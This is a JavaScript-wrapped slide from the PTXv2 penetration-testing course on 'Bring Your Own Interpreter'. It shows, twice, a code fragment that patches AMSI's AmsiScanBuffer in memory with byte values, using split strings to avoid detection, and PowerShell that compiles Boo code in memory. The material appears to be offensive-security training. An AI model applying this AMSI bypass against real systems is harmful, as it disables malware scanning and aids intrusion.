(function(){var loadHandler=window['sl_{9B7E1ACD-FE32-41D7-8304-031CE5D38424}'];loadHandler&&loadHandler(74, '<div id="spr0_94efe"><div id="spr1_94efe" class="kern slide"><img id="img2_94efe" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><a id="hl0_94efe" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg3_94efe" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr3_94efe" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_94efe" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt0_94efe" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_94efe" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg4_94efe" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr4_94efe" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_94efe" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt1_94efe" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="spr5_94efe" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt2_94efe" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 4, Module 1 - Caendra Inc. © 2020</span></div></div><div id="svg5_94efe" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl4_94efe" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg8_94efe" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr6_94efe" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl5_94efe" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt3_94efe" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl6_94efe" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg9_94efe" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_94efe" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl7_94efe" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt4_94efe" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_94efe" class="kern slide"><div id="spr8_94efe" style="left:63.75px;top:112.5px;"><div style="width:0px;"><span id="txt5_94efe" class="nokern" data-width="32.005211" style="left:20.444px;top:25.79px;">else:</span></div><div style="width:0px;"><span id="txt6_94efe" class="nokern" data-width="166.427094" style="left:20.444px;top:40.98px;">        // 32 Bits process</span></div><div style="width:0px;"><span id="txt7_94efe" class="nokern" data-width="198.432297" style="left:20.444px;top:56.34px;">        print &quot;[-] x86 Process&quot;</span></div><div style="width:0px;"><span id="txt8_94efe" class="nokern" data-width="524.885437" style="left:20.444px;top:71.7px;">        amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])</span></div><div style="width:0px;"><span id="txt9_94efe" class="nokern" data-width="441.671875" style="left:20.444px;top:87.06px;">    PatchMem(&quot;am&quot;+&quot;si.dll&quot;, &quot;Am&quot;+&quot;si&quot;+&quot;Sc&quot;+&quot;anBu&quot;+&quot;ffer&quot;, amsi_patch)</span></div><div style="width:0px;"><span id="txt10_94efe" class="nokern" data-width="12.802084" style="left:20.444px;top:102.42px;">\'@</span></div><div style="width:0px;"><span id="txt11_94efe" class="nokern" data-width="678.510437" style="left:20.444px;top:117.78px;">    #$scriptinput = New-Object &quot;Boo.Lang.Compiler.IO.StringInput&quot; -ArgumentList &quot;MyScript.boo, $BooSource&quot;</span></div><div style="width:0px;"><span id="txt12_94efe" class="nokern" data-width="550.489624" style="left:20.444px;top:133.14px;">    $scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new(&quot;MyScript.boo&quot;, $BooSource)</span></div><div style="width:0px;"><span id="txt13_94efe" class="nokern" data-width="627.302124" style="left:20.444px;top:148.5px;">    #Passing $false to the constructor tells Boo to not automatically reference default assemblies</span></div><div style="width:0px;"><span id="txt14_94efe" class="nokern" data-width="441.671875" style="left:20.444px;top:163.86px;">    $parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false)</span></div><div style="width:0px;"><span id="txt15_94efe" class="nokern" data-width="320.052094" style="left:20.444px;top:194.58px;">    $parameters.Input.Add($scriptinput) | Out-Null</span></div><div style="width:0px;"><span id="txt16_94efe" class="nokern" data-width="505.682312" style="left:20.444px;top:209.94px;">    $parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()</span></div><div style="width:0px;"><span id="txt17_94efe" class="nokern" data-width="505.682312" style="left:20.444px;top:225.3px;">    $parameters.Ducky = $true # $false increases speed but disables duck typing</span></div><div style="width:0px;"><span id="txt18_94efe" class="nokern" data-width="774.526062" style="left:20.444px;top:240.66px;">#Here we manually add assemblies as references to the compiler that will probably be used 100% of the time within our Boo</span></div><div style="width:0px;"><span id="txt19_94efe" class="nokern" data-width="25.604168" style="left:20.444px;top:253.63px;">code</span></div><div style="width:0px;"><span id="txt20_94efe" class="nokern" data-width="256.041687" style="left:20.444px;top:268.82px;">    $parameters.AddAssembly($BooLangAsm)</span></div><div style="width:0px;"><span id="txt21_94efe" class="nokern" data-width="320.052094" style="left:20.444px;top:284.18px;">    $parameters.AddAssembly($BooLangExtensionsAsm)</span></div><div style="width:0px;"><span id="txt22_94efe" class="nokern" data-width="307.250000" style="left:20.444px;top:299.54px;">    $parameters.AddAssembly($BooLangCompilerAsm)</span></div><div style="width:0px;"><span id="txt23_94efe" class="nokern" data-width="294.447937" style="left:20.444px;top:314.9px;">    $parameters.AddAssembly($BooLangParserAsm)</span></div><div style="width:0px;"><span id="txt24_94efe" class="nokern" data-width="531.286499" style="left:20.444px;top:330.26px;">    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName(&quot;mscorlib&quot;))</span></div><div style="width:0px;"><span id="txt25_94efe" class="nokern" data-width="518.484375" style="left:20.444px;top:345.62px;">    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName(&quot;System&quot;))</span></div><div style="width:0px;"><span id="txt26_94efe" class="nokern" data-width="550.489624" style="left:20.444px;top:360.98px;">    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName(&quot;System.Core&quot;))</span></div></div><div id="spr9_94efe" style="left:63.75px;top:112.5px;"><img id="img0_94efe" src="data/img48.png" width="840" height="398.25" alt=""/></div><div id="spr10_94efe" style="left:63.75px;top:112.5px;"><div style="width:0px;"><span id="txt27_94efe" class="nokern" data-width="32.005211" style="left:17.616px;top:22.961px;">else:</span></div><div style="width:0px;"><span id="txt28_94efe" class="nokern" data-width="166.427094" style="left:17.616px;top:38.152px;">        // 32 Bits process</span></div><div style="width:0px;"><span id="txt29_94efe" class="nokern" data-width="198.432297" style="left:17.616px;top:53.512px;">        print &quot;[-] x86 Process&quot;</span></div><div style="width:0px;"><span id="txt30_94efe" class="nokern" data-width="524.885437" style="left:17.616px;top:68.872px;">        amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])</span></div><div style="width:0px;"><span id="txt31_94efe" class="nokern" data-width="441.671875" style="left:17.616px;top:84.232px;">    PatchMem(&quot;am&quot;+&quot;si.dll&quot;, &quot;Am&quot;+&quot;si&quot;+&quot;Sc&quot;+&quot;anBu&quot;+&quot;ffer&quot;, amsi_patch)</span></div><div style="width:0px;"><span id="txt32_94efe" class="nokern" data-width="12.802084" style="left:17.616px;top:99.592px;">\'@</span></div><div style="width:0px;"><span id="txt33_94efe" class="nokern" data-width="678.510437" style="left:17.616px;top:114.952px;">    #$scriptinput = New-Object &quot;Boo.Lang.Compiler.IO.StringInput&quot; -ArgumentList &quot;MyScript.boo, $BooSource&quot;</span></div><div style="width:0px;"><span id="txt34_94efe" class="nokern" data-width="550.489624" style="left:17.616px;top:130.312px;">    $scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new(&quot;MyScript.boo&quot;, $BooSource)</span></div><div style="width:0px;"><span id="txt35_94efe" class="nokern" data-width="627.302124" style="left:17.616px;top:145.672px;">    #Passing $false to the constructor tells Boo to not automatically reference default assemblies</span></div><div style="width:0px;"><span id="txt36_94efe" class="nokern" data-width="441.671875" style="left:17.616px;top:161.032px;">    $parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false)</span></div><div style="width:0px;"><span id="txt37_94efe" class="nokern" data-width="320.052094" style="left:17.616px;top:191.752px;">    $parameters.Input.Add($scriptinput) | Out-Null</span></div><div style="width:0px;"><span id="txt38_94efe" class="nokern" data-width="505.682312" style="left:17.616px;top:207.112px;">    $parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()</span></div><div style="width:0px;"><span id="txt39_94efe" class="nokern" data-width="505.682312" style="left:17.616px;top:222.472px;">    $parameters.Ducky = $true # $false increases speed but disables duck typing</span></div><div style="width:0px;"><span id="txt40_94efe" class="nokern" data-width="774.526062" style="left:17.616px;top:237.832px;">#Here we manually add assemblies as references to the compiler that will probably be used 100% of the time within our Boo</span></div><div style="width:0px;"><span id="txt41_94efe" class="nokern" data-width="25.604168" style="left:17.616px;top:250.801px;">code</span></div><div style="width:0px;"><span id="txt42_94efe" class="nokern" data-width="256.041687" style="left:17.616px;top:265.992px;">    $parameters.AddAssembly($BooLangAsm)</span></div><div style="width:0px;"><span id="txt43_94efe" class="nokern" data-width="320.052094" style="left:17.616px;top:281.352px;">    $parameters.AddAssembly($BooLangExtensionsAsm)</span></div><div style="width:0px;"><span id="txt44_94efe" class="nokern" data-width="307.250000" style="left:17.616px;top:296.712px;">    $parameters.AddAssembly($BooLangCompilerAsm)</span></div><div style="width:0px;"><span id="txt45_94efe" class="nokern" data-width="294.447937" style="left:17.616px;top:312.072px;">    $parameters.AddAssembly($BooLangParserAsm)</span></div><div style="width:0px;"><span id="txt46_94efe" class="nokern" data-width="531.286499" style="left:17.616px;top:327.432px;">    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName(&quot;mscorlib&quot;))</span></div><div style="width:0px;"><span id="txt47_94efe" class="nokern" data-width="518.484375" style="left:17.616px;top:342.792px;">    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName(&quot;System&quot;))</span></div><div style="width:0px;"><span id="txt48_94efe" class="nokern" data-width="550.489624" style="left:17.616px;top:358.152px;">    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName(&quot;System.Core&quot;))</span></div></div><img id="img1_94efe" src="data/img19.png" width="23.25" height="20.25" alt="" style="left:60.11px;top:112.33px;"/><div id="spr11_94efe" style="left:832.34px;top:504.755px;"><div style="width:0px;"><span id="txt49_94efe" class="nokern" data-width="36.692707" style="left:9.6px;top:4.798px;">|  p.75</span></div></div><div id="spr12_94efe" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt50_94efe" data-width="530.987000" style="left:9.6px;top:27.438px;">1.3 Bring Your Own Interpreter</span></div></div></div></div>');})();